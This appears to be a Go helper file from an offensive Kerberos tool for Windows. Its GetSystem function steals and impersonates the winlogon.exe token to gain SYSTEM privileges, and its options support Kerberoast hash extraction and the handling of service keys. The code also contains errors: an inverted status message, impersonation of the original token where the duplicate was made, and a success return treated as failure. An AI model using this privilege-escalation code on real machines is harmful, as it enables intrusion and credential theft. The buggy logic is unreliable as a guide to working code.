package helpers

import (
	"fmt"
	"time"
	"unsafe"

	"github.com/ziggoon/gkirby/dll"
	"golang.org/x/sys/windows"
)

const (
	windowsToUnixEpochIntervals = 116444736000000000
)

const (
	ProcessQueryInformation = 0x0400
	ProcessVmRead           = 0x0010
)

type DisplayOptions struct {
	IndentLevel           int
	DisplayTGT            bool
	DisplayB64Ticket      bool
	ExtractKerberoastHash bool
	NoWrap                bool
	ServiceKey            []byte
	AsrepKey              []byte
	ServiceUser           string
	ServiceDomain         string
	KrbKey                []byte
	KeyList               []byte
	DesPlainText          string
}

type TicketDisplayFormat int

const (
	Triage TicketDisplayFormat = iota
	Klist
	Full
)

func DefaultDisplayOptions() *DisplayOptions {
	return &DisplayOptions{
		IndentLevel:           2,
		DisplayTGT:            false,
		DisplayB64Ticket:      false,
		ExtractKerberoastHash: true,
		NoWrap:                false,
	}
}

func GetSystem() bool {
	fmt.Printf("[*] Attempting to get SYSTEM privileges\n")
	isHighIntegrity, err := IsHighIntegrity()
	if err != nil {
		fmt.Printf("[-] Failed to check integrity level: %v\n", err)
		return false
	}

	if isHighIntegrity {
		fmt.Printf("[*] Current process is high integrity, looking for winlogon.exe\n")
		snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
		if err != nil {
			fmt.Printf("[-] Failed to create process snapshot: %v\n", err)
			return false
		}
		defer windows.CloseHandle(snapshot)

		var procEntry windows.ProcessEntry32
		procEntry.Size = uint32(unsafe.Sizeof(procEntry))
		if err := windows.Process32First(snapshot, &procEntry); err != nil {
			fmt.Printf("[-] Failed to get first process: %v\n", err)
			return false
		}

		for {
			processName := windows.UTF16ToString(procEntry.ExeFile[:])
			if processName == "winlogon.exe" {
				fmt.Printf("[+] Found winlogon.exe (PID: %d)\n", procEntry.ProcessID)
				handle, err := windows.OpenProcess(
					ProcessQueryInformation|ProcessVmRead,
					false,
					procEntry.ProcessID,
				)
				if err != nil {
					fmt.Printf("[-] Failed to open winlogon.exe: %v\n", err)
					return false
				}

				var token windows.Token
				err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE, &token)
				if err != nil {
					fmt.Printf("[-] Failed to open process token: %v\n", err)
					return false
				}
				defer token.Close()

				var duplicateToken windows.Token
				err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenPrimary, &duplicateToken)
				if err != nil {
					fmt.Printf("[-] Failed to duplicate token: %v\n", err)
					return false
				}

				ret, _, err := dll.ImpersonateLoggedOnUser.Call(uintptr(token))
				if ret != 0 {
					fmt.Printf("[-] Failed to impersonate user: %v\n", err)
					return false
				}

				fmt.Printf("[+] Successfully impersonated SYSTEM token\n")
				return true
			}

			err = windows.Process32Next(snapshot, &procEntry)
			if err != nil {
				if err == windows.ERROR_NO_MORE_FILES {
					fmt.Printf("[-] Could not find winlogon.exe process\n")
					break
				}
				fmt.Printf("[-] Error enumerating processes: %v\n", err)
				return false
			}
		}
		return false
	}
	fmt.Printf("[*] Process already running with high integrity\n")
	return false
}

func IsAdmin() (bool, error) {
	fmt.Printf("[*] Checking admin status\n")
	var token windows.Token
	procHandle := windows.CurrentProcess()

	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
	if err != nil {
		fmt.Printf("[-] OpenProcessToken failed: %v\n", err)
		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer token.Close()

	var elevated uint32
	var size uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevated)), uint32(unsafe.Sizeof(elevated)), &size)
	if err != nil {
		fmt.Printf("[-] GetTokenInformation failed: %v\n", err)
		return false, fmt.Errorf("GetTokenInformation failed: %v", err)
	}

	isElevated := elevated != 0
	fmt.Printf("[+] Admin status: %v\n", isElevated)
	return isElevated, nil
}

func IsSystem() (bool, error) {
	var token windows.Token
	procHandle := windows.CurrentProcess()
	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer token.Close()

	user, err := token.GetTokenUser()
	if err != nil {
		return false, fmt.Errorf("GetTokenUser failed: %v", err)
	}

	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err != nil {
		return false, fmt.Errorf("CreateWellKnownSid failed: %v", err)
	}

	return windows.EqualSid(user.User.Sid, systemSid), nil
}

func IsHighIntegrity() (bool, error) {
	var token windows.Token
	h := windows.CurrentProcess()
	err := windows.OpenProcessToken(h, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false, err
	}
	defer token.Close()

	var isElevated uint32
	var returnedLen uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), uint32(unsafe.Sizeof(isElevated)), &returnedLen)
	if err != nil {
		return false, err
	}

	return isElevated != 0, nil
}

func FileTimeToTime(fileTime int64) time.Time {
	nsec := (fileTime - windowsToUnixEpochIntervals) * 100
	return time.Unix(0, nsec).Local()
}
